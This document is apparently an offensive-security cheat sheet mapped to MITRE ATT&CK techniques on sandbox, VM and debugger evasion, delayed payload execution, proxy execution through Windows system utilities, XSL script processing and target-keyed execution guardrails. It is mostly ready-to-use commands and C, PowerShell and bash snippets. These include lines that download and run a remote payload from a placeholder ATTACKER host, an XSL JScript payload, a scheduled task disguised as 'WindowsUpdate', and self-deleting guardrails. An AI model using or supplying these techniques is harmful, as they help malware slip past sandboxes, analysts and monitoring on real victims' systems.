# Anti-Detection: Sandbox Evasion, Debugger Evasion & Execution Guardrails

## MITRE ATT&CK Mapping
- **T1497** — Virtualization/Sandbox Evasion
- **T1497.001** — System Checks
- **T1497.002** — User Activity Based Checks
- **T1497.003** — Time Based Evasion
- **T1622** — Debugger Evasion
- **T1497.003 / Custom** — Delay Execution (Sleep-based sandbox timeout evasion)
- **T1202** — Indirect Command Execution
- **T1220** — XSL Script Processing
- **T1480** — Execution Guardrails

---

## 1. T1497 — Virtualization/Sandbox Evasion

### 1a. System Checks (T1497.001) — Windows

```cmd
:: Registry artifacts — VMware
reg query "HKLM\SOFTWARE\VMware, Inc.\VMware Tools" 2>nul && echo [!] VMware detected

:: Registry artifacts — VirtualBox
reg query "HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions" 2>nul && echo [!] VBox detected

:: Hyper-V
reg query "HKLM\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters" 2>nul && echo [!] Hyper-V detected
```

```powershell
# Process-based detection
$vmProcs = @('vmtoolsd','vmwaretray','VBoxService','VBoxTray','vmusrvc','vmsrvc','xenservice','qemu-ga','joeboxserver','joeboxcontrol','prl_tools')
Get-Process | Where-Object { $vmProcs -contains $_.Name } | Select-Object Name

# MAC prefix check (first 3 octets)
# 00:0C:29, 00:50:56 = VMware | 08:00:27 = VirtualBox | 00:1C:42 = Parallels | 00:16:3E = Xen
Get-NetAdapter | Select-Object Name, MacAddress | ForEach-Object {
    $mac = $_.MacAddress.Replace('-',':').Substring(0,8)
    if ($mac -in @('00:0C:29','00:50:56','08:00:27','00:1C:42','00:16:3E')) { Write-Output "[!] VM MAC: $($_.MacAddress)" }
}

# Hardware checks — low disk/RAM = sandbox
if ((Get-WmiObject Win32_DiskDrive | Measure-Object -Property Size -Sum).Sum / 1GB -lt 60) { Write-Output "[!] Disk < 60GB — possible sandbox" }
if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB -lt 2) { Write-Output "[!] RAM < 2GB — possible sandbox" }

# CPUID check — hypervisor bit (bit 31 of ECX from CPUID leaf 1)
# If set, running under hypervisor. Requires inline assembly or WMI:
(Get-WmiObject Win32_Processor).Manufacturer  # "GenuineIntel" vs "KVMKVMKVM" / "Microsoft Hv" / "VMwareVMware"

# Device names
Get-WmiObject Win32_BIOS | Select-Object SMBIOSBIOSVersion, Manufacturer
# VMware: "PhoenixBIOS", VBox: "VirtualBox", QEMU: "SeaBIOS"
```

### 1b. System Checks (T1497.001) — Linux

```bash
# systemd-detect-virt — canonical Linux VM detection
systemd-detect-virt         # Returns: "vmware", "oracle", "kvm", "microsoft", "xen", or "none"

# DMI/SMBIOS checks
cat /sys/class/dmi/id/sys_vendor        # "VMware, Inc.", "innotek GmbH" (VBox), "QEMU", "Microsoft Corporation"
cat /sys/class/dmi/id/product_name      # "VMware Virtual Platform", "VirtualBox", "Standard PC"
sudo dmidecode -s system-manufacturer   # Requires root

# CPU flags — hypervisor flag
lscpu | grep -i hypervisor              # "Hypervisor vendor: VMware" or "Flags: ... hypervisor"
grep -c hypervisor /proc/cpuinfo        # >0 = virtualized

# Hardware fingerprinting
lspci | grep -iE "virtual|vmware|vbox|qemu|xen|virtio"
ls /dev/disk/by-id/ | grep -iE "vmware|vbox|qemu|virtio"

# Process check
ps aux | grep -iE "vmtoolsd|VBoxService|qemu-ga|xe-daemon|spice-vdagent" | grep -v grep
```

### 1c. User Activity Based Checks (T1497.002)

```powershell
# Empty desktop = sandbox (real users have files)
if ((Get-ChildItem "$env:USERPROFILE\Desktop" -ErrorAction SilentlyContinue | Measure-Object).Count -lt 3) { Write-Output "[!] Desktop nearly empty — sandbox?" }

# Recent files — sandboxes have none
if ((Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue | Measure-Object).Count -lt 5) { Write-Output "[!] Few recent files — sandbox?" }

# Browser history check — no browsing = sandbox
Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"  # False = no Chrome installed/used

# USB history — real machines have USB device history
(Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Enum\USB\*\*" -ErrorAction SilentlyContinue).Count
# 0 or very low = sandbox

# Uptime check — sandbox freshly booted, real machines run longer
if ((Get-CimInstance Win32_OperatingSystem).LastBootUpTime -gt (Get-Date).AddHours(-1)) { Write-Output "[!] Booted < 1h ago — sandbox?" }
```

### 1d. Time Based Evasion (T1497.003)

```powershell
# Sleep acceleration detection — sandboxes fast-forward sleep
$before = [Environment]::TickCount
Start-Sleep -Seconds 10
$after = [Environment]::TickCount
$elapsed = $after - $before
if ($elapsed -lt 9500) { Write-Output "[!] Sleep accelerated ($elapsed ms for 10s sleep) — sandbox detected"; exit }

# GetTickCount consistency check
$t1 = [Environment]::TickCount; Start-Sleep -Milliseconds 500; $t2 = [Environment]::TickCount
if (($t2 - $t1) -lt 400) { Write-Output "[!] Time manipulation detected"; exit }
```

```c
// RDTSC timing check (C — compile on target or embed in implant)
// Execute RDTSC before and after a delay — if delta too small, time is accelerated
#include <intrin.h>
unsigned __int64 t1 = __rdtsc();
Sleep(2000);
unsigned __int64 t2 = __rdtsc();
if ((t2 - t1) < 2000000000ULL) { /* sandbox — delta too small */ ExitProcess(0); }
```

---

## 2. T1622 — Debugger Evasion

### 2a. Windows Anti-Debug

```c
// IsDebuggerPresent — simplest check (easily bypassed, but a first layer)
if (IsDebuggerPresent()) ExitProcess(0);

// PEB.BeingDebugged — manual read (harder to hook)
#include <winternl.h>
PPEB peb = NtCurrentTeb()->ProcessEnvironmentBlock;
if (peb->BeingDebugged) ExitProcess(0);

// NtQueryInformationProcess — DebugPort check
DWORD debugPort = 0;
NtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, &debugPort, sizeof(debugPort), NULL);
if (debugPort != 0) ExitProcess(0);

// OutputDebugString timing trick
DWORD t1 = GetTickCount();
OutputDebugStringW(L"x");  // If debugger attached, this is slow
DWORD t2 = GetTickCount();
if ((t2 - t1) > 10) ExitProcess(0);  // Debugger processing the string

// INT 2Dh — kernel debug interrupt, debugger swallows it; without debugger, raises exception
__try { __asm { int 0x2D } } __except(EXCEPTION_EXECUTE_HANDLER) { /* No debugger — continue */ }
// If we reach past __try without exception → debugger attached

// Structured Exception Handling (SEH) anti-debug
__try { *(int*)0 = 0; }  // Force access violation
__except(EXCEPTION_EXECUTE_HANDLER) { /* Clean — no debugger */ return; }
// If debugger intercepts the exception, we never reach the handler
```

### 2b. Linux Anti-Debug

```bash
# ptrace anti-debug — process can only be traced once
# If ptrace(PTRACE_TRACEME) fails, a debugger is already attached
python3 -c "
import ctypes, sys, os
libc = ctypes.CDLL('libc.so.6')
PTRACE_TRACEME = 0
if libc.ptrace(PTRACE_TRACEME, 0, 0, 0) == -1:
    print('[!] Debugger detected (ptrace already attached)')
    sys.exit(1)
print('[+] No debugger — continuing')
"

# /proc/self/status TracerPid check
tracerpid=$(grep TracerPid /proc/self/status | awk '{print $2}')
if [ "$tracerpid" -ne 0 ]; then echo "[!] Being traced by PID $tracerpid"; exit 1; fi

# Anti-strace via timing (strace adds significant overhead)
t1=$(date +%s%N); for i in $(seq 1 1000); do :; done; t2=$(date +%s%N)
elapsed=$(( (t2 - t1) / 1000000 ))
if [ "$elapsed" -gt 100 ]; then echo "[!] Possible strace/ltrace (${elapsed}ms for trivial loop)"; fi
```

---

## 3. Delay Execution (Sandbox Timeout Evasion)

Most automated sandboxes analyze for 2-5 minutes then give up. Delay execution past this window.
**Tag MITRE: T1497.003**

```bash
# Linux — simple sleep (sleep past sandbox timeout)
sleep 300 && ./payload                 # 5 min delay
sleep $((RANDOM % 600 + 300)) && ./payload  # Random 5-10 min delay

# Delayed execution via at/cron
echo "./payload" | at now + 10 minutes  # Execute in 10 minutes
(crontab -l; echo "*/15 * * * * /tmp/.payload") | crontab -  # Every 15 min
```

```powershell
# Windows — sleep-based
Start-Sleep -Seconds 300; & C:\temp\payload.exe

# Ping delay (no PowerShell needed — works in restricted cmd)
ping -n 300 127.0.0.1 >nul & C:\temp\payload.exe     # ~300 second delay

# Scheduled task for delayed execution
schtasks /create /tn "WindowsUpdate" /tr "C:\temp\payload.exe" /sc once /st 14:00 /f
# Verify: schtasks /query /tn "WindowsUpdate"
```

---

## 4. T1202 — Indirect Command Execution

Execute commands through legitimate system utilities to evade command-line monitoring.

```cmd
:: Forfiles — proxy execution through file enumeration tool
forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c C:\temp\payload.exe"
:: Any file match triggers /c command. Notepad always exists in System32.

:: pcalua.exe — Program Compatibility Assistant (rarely monitored)
pcalua.exe -a C:\temp\payload.exe
pcalua.exe -a C:\temp\payload.exe -d C:\temp    :: Specify working directory

:: WSL — execute through Windows Subsystem for Linux
wsl.exe -e /bin/bash -c "whoami && id"
wsl.exe -- curl http://ATTACKER/payload.sh | bash   :: Download + exec via Linux subsystem

:: Scriptrunner.exe — App-V script runner
scriptrunner.exe -appvscript C:\temp\payload.cmd

:: ssh.exe ProxyCommand abuse — execute arbitrary commands
ssh -o ProxyCommand="cmd /c C:\temp\payload.exe" nonexistent-host

:: MSHTA + inline JavaScript
mshta "javascript:a=new ActiveXObject('WScript.Shell');a.Run('cmd /c C:\\temp\\payload.exe',0);close()"
```

---

## 5. T1220 — XSL Script Processing

```cmd
:: WMIC /FORMAT — fetch and execute remote XSL containing embedded JScript
wmic os get /FORMAT:"https://ATTACKER/payload.xsl"

:: msxsl.exe — Microsoft XML transformation tool (must be uploaded/present)
msxsl.exe data.xml payload.xsl
:: msxsl accepts any file extensions, so: msxsl.exe report.txt report.txt (if both are valid XSL)
```

Example XSL payload:
```xml
<?xml version='1.0'?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="urn:user">
  <msxsl:script language="JScript" implements-prefix="user">
    function exec() { new ActiveXObject('WScript.Shell').Run('cmd /c whoami > C:\\temp\\out.txt'); }
  </msxsl:script>
  <xsl:template match="/"><xsl:value-of select="user:exec()"/></xsl:template>
</xsl:stylesheet>
```

---

## 6. T1480 — Execution Guardrails

Ensure payload only executes on the intended target — useless in sandboxes or analyst VMs.

```powershell
# Environmental keying — derive decryption key from target-specific values
$key = [System.Text.Encoding]::UTF8.GetBytes(($env:COMPUTERNAME + $env:USERDOMAIN).PadRight(16).Substring(0,16))
# Payload encrypted with this key only decrypts on the correct machine
# In sandbox → wrong key → garbage output → no execution

# Domain check — only run if joined to expected domain
if ($env:USERDOMAIN -ne "TARGETCORP") { exit }

# Username check
if ($env:USERNAME -ne "targetuser") { Remove-Item $MyInvocation.MyCommand.Path; exit }
```

```c
// Mutex — prevent multiple instances + can serve as a guardrail token
HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\MyUniquePayload123");
if (GetLastError() == ERROR_ALREADY_EXISTS) { ExitProcess(0); }  // Already running

// Machine GUID keying — unique per Windows install
// Read HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid
// Hash it → use as AES key → payload only decrypts on that specific machine
```

```bash
# Linux guardrails
# Only execute on correct hostname
[ "$(hostname)" != "target-server" ] && exit 1

# IP-based guardrail
myip=$(hostname -I | awk '{print $1}')
[ "$myip" != "10.0.1.50" ] && rm -f "$0" && exit 1

# Only execute if specific user exists
id targetuser >/dev/null 2>&1 || exit 1
```

---

## References
- MITRE T1497: https://attack.mitre.org/techniques/T1497/
- MITRE T1622: https://attack.mitre.org/techniques/T1622/
- MITRE T1202: https://attack.mitre.org/techniques/T1202/
- MITRE T1220: https://attack.mitre.org/techniques/T1220/
- MITRE T1480: https://attack.mitre.org/techniques/T1480/
- al-khaser (anti-analysis toolkit): https://github.com/LordNoteworthy/al-khaser
- Pafish (sandbox detection): https://github.com/a0rtega/pafish
- LOLBAS Project: https://lolbas-project.github.io/
